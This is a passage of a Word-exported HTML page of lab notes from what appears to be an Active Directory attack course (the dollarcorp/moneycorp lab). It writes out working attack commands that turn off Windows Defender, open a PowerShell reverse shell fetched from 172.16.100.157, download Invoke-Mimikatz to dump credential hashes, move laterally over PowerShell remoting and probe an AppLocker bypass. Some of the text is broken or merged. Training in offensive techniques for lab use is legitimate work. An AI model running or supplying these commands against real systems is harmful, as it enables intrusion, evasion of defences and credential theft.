  border-top:none;mso-border-top-alt:solid #A3A3A3 1.0pt;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
  C:\AD\Tools&gt; Invoke-<span class=SpellE>CheckLocalAdminAccess</span> -<span
  class=SpellE>ComputerName</span> dcorp-<span class=GramE>stud157.dollarcorp.moneycorp</span>.local<o:p></o:p></span></p>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>
  <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
  EN-IN'>ComputerName</span></span><span lang=EN-IN style='mso-ansi-language:
  EN-IN'><span style='mso-spacerun:yes'>                             </span><span
  class=SpellE>IsAdmin</span><o:p></o:p></span></p>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>------------<span
  style='mso-spacerun:yes'>                             </span>-------<o:p></o:p></span></p>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>dcorp-<span
  class=GramE>stud157.dollarcorp.moneycorp</span>.local<span
  style='mso-spacerun:yes'>   </span>False<o:p></o:p></span></p>
  </td>
 </tr>
 <tr style='mso-yfti-irow:2;mso-yfti-lastrow:yes'>
  <td width=681 valign=top style='width:510.85pt;border:solid #A3A3A3 1.0pt;
  border-top:none;mso-border-top-alt:solid #A3A3A3 1.0pt;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
  C:\AD\Tools&gt; Invoke-<span class=SpellE>CheckLocalAdminAccess</span> -<span
  class=SpellE>ComputerName</span> <span class=SpellE>dcorp-<span class=GramE>adminsrv.dollarcorp</span>.moneycorp.local</span><o:p></o:p></span></p>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>
  <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
  EN-IN'>ComputerName</span></span><span lang=EN-IN style='mso-ansi-language:
  EN-IN'><span style='mso-spacerun:yes'>                              </span><span
  class=SpellE>IsAdmin</span><o:p></o:p></span></p>
  <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>------------<span
  style='mso-spacerun:yes'>                              </span>-------<o:p></o:p></span></p>
  <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
  EN-IN'>dcorp-<span class=GramE>adminsrv.dollarcorp</span>.moneycorp.local</span></span><span
  lang=EN-IN style='mso-ansi-language:EN-IN'><span style='mso-spacerun:yes'>   
  </span>True<o:p></o:p></span></p>
  </td>
 </tr>
</table>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_87" o:spid="_x0000_i1061" type="#_x0000_t75" style='width:501.75pt;
 height:3in;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image026.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=669 height=288
src="test_files/image027.jpg" v:shapes="Picture_x0020_87"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_86" o:spid="_x0000_i1060" type="#_x0000_t75" style='width:525.75pt;
 height:270pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image028.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=701 height=360
src="test_files/image029.jpg" v:shapes="Picture_x0020_86"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>As we have <span
class=SpellE>localAdmin</span> privileges we can disable windows defender <o:p></o:p></span></p>

<p class=MsoNormal><b><span lang=EN-IN style='mso-ansi-language:EN-IN'>Issue</span></b><span
lang=EN-IN style='mso-ansi-language:EN-IN'>: anti-virus of payload (unzip it
again refresh) second problem is that firewall incoming connection so let's it
off.<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Set-<span
class=SpellE>MpPreference</span> -<span class=SpellE>DisableRealtimeMonitoring</span>
$true (OR) Set-<span class=SpellE>MpPreference</span> -<span class=SpellE>DisableIOAVProtection</span>
$true<o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>2. PS
C:\AD\Tools<span class=GramE>&gt; .</span> .\PowerView.ps1<span
style='mso-spacerun:yes'>   </span>--<span class=GramE>&gt;<span
style='mso-spacerun:yes'>  </span>where</span> <span class=SpellE>studentx</span>
has local administrative access.<span style='mso-spacerun:yes'> 
</span>(Find-PSRemotingLocalAdminAccess.ps1 script)<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\AD\Tools&gt; Find-<span class=SpellE>LocalAdminAccess</span><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>dcorp-<span
class=GramE>stud157.dollarcorp.moneycorp</span>.local<o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>dcorp-<span class=GramE>adminsrv.dollarcorp</span>.moneycorp.local</span></span><span
lang=EN-IN style='mso-ansi-language:EN-IN'><o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>3.<span
style='mso-spacerun:yes'>  </span>make sure that <span class=GramE>have to</span>
disabled firewall incoming connection (Reverse connective or any shell for an
access_<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>powershell.exe
<span class=SpellE>iex</span> (<span class=SpellE>iwr</span> <a
href="http://172.16.100.157/Invoke-PowerShellTcp.ps1">http://172.16.100.157/Invoke-PowerShellTcp.ps1</a></span><span
style='mso-ansi-language:EN-IN'> <span lang=EN-IN>-<span class=SpellE>UseBasicParsing</span><span
class=GramE>);Invoke</span>-<span class=SpellE>PowerShellTcp</span> -Reverse -<span
class=SpellE>IPAddress</span> 172.16.100.157 -Port 443<o:p></o:p></span></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>or<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>powershell.exe
-c <span class=SpellE>iex</span> ((New-Object Net.WebClient<span class=GramE>).DownloadString</span>('http://172.16.100.157/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp
-Reverse -<span class=SpellE>IPAddress</span> 172.16.100.157 -Port 443<o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span class=SpellE><span class=GramE><b><span lang=EN-IN
style='mso-ansi-language:EN-IN'>Ciadmin</span></b></span></span><span
class=GramE>(</span>Web Application got an shell(Hostname <span class=SpellE>dcorp</span>-ci)
&amp; <span class=SpellE><b><span lang=EN-IN style='mso-ansi-language:EN-IN'>Adminsrv</span></b></span><b><span
lang=EN-IN style='mso-ansi-language:EN-IN'> </span></b>(from local admin
access)<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\AD\Tools&gt; Find-<span class=SpellE>LocalAdminAccess</span><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>dcorp-<span
class=GramE>stud157.dollarcorp.moneycorp</span>.local<o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>dcorp-<span class=GramE>adminsrv.dollarcorp</span>.moneycorp.local</span></span><span
lang=EN-IN style='mso-ansi-language:EN-IN'><o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>You can use the modified version of <span class=SpellE>powerview</span>
as well <span class=GramE>as you can</span> bypass mg. we can use this current
session only.<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_85" o:spid="_x0000_i1059" type="#_x0000_t75" style='width:561.75pt;
 height:183pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image030.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=749 height=244
src="test_files/image031.jpg" v:shapes="Picture_x0020_85"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\Program Files (x<span class=GramE>86)\Jenkins\workspace\project0</span>&gt;
Invoke-<span class=SpellE>UserHunter</span> (checking for local admin privilege
on session)<o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\Program Files (x<span class=GramE>86)\Jenkins\workspace\project0</span>&gt;
Invoke-<span class=SpellE>UserHunter</span> -<span class=SpellE>checkaccess</span><o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>UserDomain</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'><span
style='mso-spacerun:yes'>    </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span> <span class=SpellE>dcorp</span><o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>UserName</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'><span
style='mso-spacerun:yes'>      </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span> <span class=SpellE>svcadmin</span><span
style='mso-spacerun:yes'>                                                                             
</span><o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>ComputerName</span></span><span lang=EN-IN style='mso-ansi-language:
EN-IN'><span style='mso-spacerun:yes'>  </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span> <span class=SpellE>dcorp-mgmt.dollarcorp.moneycorp.local</span><span
style='mso-spacerun:yes'>  </span>--&gt; <o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>IPAddress</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'><span
style='mso-spacerun:yes'>     </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span> 172.16.4.44<o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>SessionFrom</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'><span
style='mso-spacerun:yes'>   </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span><o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span class=GramE><span lang=EN-IN
style='mso-ansi-language:EN-IN'>SessionFromName</span></span></span><span
class=GramE><span lang=EN-IN style='mso-ansi-language:EN-IN'> :</span></span><span
lang=EN-IN style='mso-ansi-language:EN-IN'><o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>LocalAdmin</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'><span
style='mso-spacerun:yes'>    </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span> True<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\Program Files (x<span class=GramE>86)\Jenkins\workspace\project0</span>&gt;
Invoke-Command -<span class=SpellE>ComputerName</span> <span class=SpellE>dcorp-mgmt.dollarcorp.moneycorp.local</span>
-<span class=SpellE>ScriptBlock</span> {<span class=SpellE>whoami;hostname</span>}<span
style='mso-spacerun:yes'>  </span>--verification <o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>dcorp</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'>\<span
class=SpellE>ciadmin</span><o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>dcorp-mgmt</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'><o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\Program Files (x<span class=GramE>86)\Jenkins\workspace\project0</span>&gt; <span
class=SpellE>whoami</span><span style='mso-spacerun:yes'>  </span>--&gt; find <span
class=SpellE>dcorp-mgment</span> have local privilege and also access to us.<o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>dcorp</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'>\<span
class=SpellE>ciadmin</span><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\Program Files (x<span class=GramE>86)\Jenkins\workspace\project0</span>&gt; <span
class=SpellE>iex</span> (<span class=SpellE>iwr</span> <a
href="http://172.16.100.157/Invoke-Mimikatz.ps1">http://172.16.100.157/Invoke-Mimikatz.ps1</a>
-<span class=SpellE>UseBasicParsing</span>)<span style='mso-spacerun:yes'> 
</span>--&gt; dump hashes <o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\Program Files (x<span class=GramE>86)\Jenkins\workspace\project0</span>&gt;
$sess = New-<span class=SpellE>PSSession</span> -<span class=SpellE>ComputerName</span>
<span class=SpellE>dcorp-mgmt.dollarcorp.moneycorp.local</span><span
style='mso-spacerun:yes'>   </span>--&gt; create session for execute your
payload in remote machine before must be disable anti-virus (because anti-virus
will block in memory for execution)<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\Program Files (x<span class=GramE>86)\Jenkins\workspace\project0</span>&gt;
Invoke-command -<span class=SpellE>ScriptBlock</span>{Set-<span class=SpellE>MpPreference</span>
-<span class=SpellE>DisableIOAVProtection</span> $true} -Session $sess<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\Program Files (x<span class=GramE>86)\Jenkins\workspace\project0</span>&gt;
Invoke-command -<span class=SpellE>ScriptBlock</span> ${<span class=SpellE>function:Invoke-Mimikatz</span>}
-Session $sess<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Now we have
got <span class=SpellE><span class=GramE><b>svcadmin</b></span></span><span
class=GramE><span style='mso-spacerun:yes'>  </span>account</span>. <o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_84" o:spid="_x0000_i1058" type="#_x0000_t75" style='width:853.5pt;
 height:339pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image032.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1138 height=452
src="test_files/image033.jpg" v:shapes="Picture_x0020_84"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_83" o:spid="_x0000_i1057" type="#_x0000_t75" style='width:734.25pt;
 height:234pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image034.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=979 height=312
src="test_files/image035.jpg" v:shapes="Picture_x0020_83"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\AD\Tools<span class=GramE>&gt; .</span> .\PowerView.ps1<o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\AD\Tools&gt; Find-<span class=SpellE>LocalAdminAccess</span><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>dcorp-<span
class=GramE>stud157.dollarcorp.moneycorp</span>.local<span
style='mso-spacerun:yes'>     </span>--&gt; your first machine.<o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>dcorp-<span class=GramE>adminsrv.dollarcorp</span>.moneycorp.local</span></span><span
lang=EN-IN style='mso-ansi-language:EN-IN'><span style='mso-spacerun:yes'>   
</span>--&gt; local admin access machine<o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\AD\Tools<span class=GramE>&gt; .</span>
.\Find-PSRemotingLocalAdminAccess.ps1<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\AD\Tools&gt; Find-<span class=SpellE>PSRemotingLocalAdminAccess</span><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>dcorp-stud157<o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>dcorp-adminsrv</span></span><span lang=EN-IN style='mso-ansi-language:
EN-IN'><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\Windows\system32<span class=GramE>&gt;<span style='mso-spacerun:yes'> 
</span>Invoke</span>-Command -<span class=SpellE>ComputerName</span> <span
class=SpellE>dcorp-adminsrv.dollarcorp.moneycorp.local</span> -<span
class=SpellE>ScriptBlock</span> {<span class=SpellE>whoami;hostname</span>}<o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>dcorp</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'>\<span
class=SpellE>svcadmin</span><o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>dcorp-adminsrv</span></span><span lang=EN-IN style='mso-ansi-language:
EN-IN'><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
C:\Windows\system32&gt;<o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Also, any
attempt to run Invoke-Mimikatz on <span class=SpellE>dcorp-adminsrv</span>
results in errors about language mode.<span style='mso-spacerun:yes'>  
</span>--<span class=GramE>&gt;<span style='mso-spacerun:yes'>  </span>language</span>
mode.<span style='mso-spacerun:yes'>  </span>explained in enumeration<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>This is because
<span class=SpellE>Applocker</span> is configured on <span class=SpellE>dcorp-<span
class=GramE>mgmt</span></span> and we drop into a <span class=SpellE>ConstrainedLanguage</span>
Mode when we connect using PowerShell Remoting.<o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>[<span
class=SpellE>dcorp-<span class=GramE>adminsrv.dollarcorp</span>.moneycorp.local</span>]:
PS C:\Users\student157\Documents&gt; $<span class=SpellE>ExecutionContext.SessionState.LanguageModeConstrainedLanguage</span><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Now, lets
enumerate the <span class=SpellE>applocker</span> policy.<o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>[<span
class=SpellE>dcorp-<span class=GramE>adminsrv.dollarcorp</span>.moneycorp.local</span>]:
PS C:\Users\student157\Documents&gt; Get-<span class=SpellE>AppLockerPolicy</span>
-Effective | select -<span class=SpellE>ExpandProperty</span> <span
class=SpellE>RuleCollections</span><o:p></o:p></span></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>PathConditions</span></span><span lang=EN-IN style='mso-ansi-language:
EN-IN'><span style='mso-spacerun:yes'>    </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span> {%PROGRAMFILES%\*}<o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>PathExceptions</span></span><span lang=EN-IN style='mso-ansi-language:
EN-IN'><span style='mso-spacerun:yes'>    </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span> {}<o:p></o:p></span></p>

<p class=MsoNormal><span class=GramE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>PublisherExceptions :</span></span><span lang=EN-IN style='mso-ansi-language:
EN-IN'> {}<o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>HashExceptions</span></span><span lang=EN-IN style='mso-ansi-language:
EN-IN'><span style='mso-spacerun:yes'>    </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span> {}<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Id<span
style='mso-spacerun:yes'>                </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span> 06dce67b-934c-454f-a263-2515c8796a5d<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Name<span
style='mso-spacerun:yes'>              </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span> (Default Rule) All scripts located
in the Program Files folder<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Description<span
style='mso-spacerun:yes'>       </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span> Allows members of the Everyone group
to run scripts that are located in the Program Files folder.<o:p></o:p></span></p>

<p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
EN-IN'>UserOrGroupSid</span></span><span lang=EN-IN style='mso-ansi-language:
EN-IN'><span style='mso-spacerun:yes'>    </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span> S-1-1-0<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Action<span
style='mso-spacerun:yes'>            </span><span class=GramE><span
style='mso-spacerun:yes'>  </span>:</span> Allow<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_82" o:spid="_x0000_i1056" type="#_x0000_t75" style='width:858.75pt;
 height:282pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image036.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1145 height=376
src="test_files/image037.jpg" v:shapes="Picture_x0020_82"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>We have
exception from the program directory<o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_81" o:spid="_x0000_i1055" type="#_x0000_t75" style='width:851.25pt;
 height:373.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image038.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1135 height=498
src="test_files/image039.jpg" v:shapes="Picture_x0020_81"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_80" o:spid="_x0000_i1054" type="#_x0000_t75" style='width:831pt;
 height:432.75pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image040.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1108 height=577
src="test_files/image041.jpg" v:shapes="Picture_x0020_80"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_79" o:spid="_x0000_i1053" type="#_x0000_t75" style='width:483pt;
 height:172.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image042.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=644 height=230
src="test_files/image043.jpg" v:shapes="Picture_x0020_79"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_78" o:spid="_x0000_i1052" type="#_x0000_t75" style='width:855pt;
 height:50.25pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image044.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1140 height=67
src="test_files/image045.jpg" v:shapes="Picture_x0020_78"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>Now we have <span class=SpellE><b><span lang=EN-IN
style='mso-ansi-language:EN-IN'>srvadmin</span></b></span> user account hash.<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_77" o:spid="_x0000_i1051" type="#_x0000_t75" style='width:552pt;
 height:418.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image046.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=736 height=558
src="test_files/image047.jpg" v:shapes="Picture_x0020_77"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_76" o:spid="_x0000_i1050" type="#_x0000_t75" style='width:359.25pt;
 height:113.25pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image048.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=479 height=151
src="test_files/image049.jpg" v:shapes="Picture_x0020_76"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_75" o:spid="_x0000_i1049" type="#_x0000_t75" style='width:741.75pt;
 height:140.25pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image050.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=989 height=187
src="test_files/image051.jpg" v:shapes="Picture_x0020_75"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_74" o:spid="_x0000_i1048" type="#_x0000_t75" style='width:479.25pt;
